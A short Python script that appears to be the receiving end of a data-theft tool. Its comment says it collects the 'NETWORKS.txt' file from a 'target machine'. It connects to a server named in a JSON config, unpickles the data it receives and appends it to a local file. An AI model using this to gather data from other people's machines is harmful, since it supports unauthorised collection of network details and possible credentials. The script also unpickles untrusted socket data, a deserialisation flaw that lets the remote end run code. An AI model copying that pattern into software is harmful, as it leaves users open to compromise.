# in this script you will receive the content of the "NETWORKS.txt"
# file of the target machine

import socket, json, pickle
from argparse import ArgumentParser

def con_and_recv(host, port):
    print("[+] Trying To Connect To The Server")
    s = socket.socket()
    s.connect((host, port))
    message = s.recv(1024)
    print("Output: ", pickle.loads(message))
    with open("NETWORKS.txt", "a+") as file:
        file.write(pickle.loads(message))
    s.close()

if __name__ == "__main__":
    with open("PRMTR.json", "r+") as file:
        args = json.load(file) 
        con_and_recv(args["server_ip"], args["server_port"])
